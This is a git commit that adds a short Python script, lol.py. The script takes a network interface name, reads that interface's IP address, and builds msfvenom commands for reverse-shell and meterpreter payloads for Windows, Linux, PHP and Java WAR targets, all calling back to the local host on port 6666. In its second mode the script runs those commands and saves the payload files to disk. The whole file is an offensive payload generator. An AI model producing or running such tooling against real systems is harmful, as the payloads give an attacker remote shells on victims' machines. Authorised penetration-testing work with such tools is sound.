2fce37ef1bc187500029fcfd6c803df7be0ab361
root <root@localhost.localdomain>
2020-01-20 18:21:17 +1000

    :)

---
+++ lol.py
@@ -0,0 +1,44 @@
+import os
+import sys
+import netifaces as ni
+import sys
+
+if len(sys.argv) != 3:
+    print("Syntax: {} <interface name> <type>".format(sys.argv[0]))
+    print("Type 1: spits out commands.")
+    print("Type 2: creates shells.")
+    exit()
+
+# get ip
+winterface = sys.argv[1]
+
+ni.ifaddresses(winterface)
+ip = ni.ifaddresses(winterface)[ni.AF_INET][0]['addr']
+
+# take in desired ip address
+run_type = int(sys.argv[2])
+this_ip = ip
+this_port = 6666 # TODO: this is static for now but should make option to cycle/send in on command line
+shell_list =[]
+
+# add shells to list
+shell_list.append("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f exe > win_shell_{}_{}.exe".format(this_ip, this_port, this_ip, this_port))
+
+shell_list.append("msfvenom -p linux/x86/shell_reverse_tcp LHOST={} LPORT={} -f elf > lin_shell_{}_{}.elf".format(this_ip,this_port, this_ip, this_port))
+
+shell_list.append("msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > win_met_{}_{}.exe".format(this_ip, this_port, this_ip, this_port))
+
+shell_list.append("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > lin_met_{}_{}.elf".format(this_ip,this_port, this_ip, this_port))
+
+shell_list.append("msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw > php_met_{}_{}.php".format(this_ip,this_port, this_ip, this_port))
+
+shell_list.append("msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw > war_met_{}_{}.war".format(this_ip,this_port, this_ip, this_port))
+
+print("# shells == {}".format(len(shell_list)))
+print("Run type is {}\n\n".format(run_type))
+
+for shell in shell_list:
+    print("COMMAND: {}".format(shell))
+    if run_type==2:
+        os.system(shell)
+        print("Saved!\n")
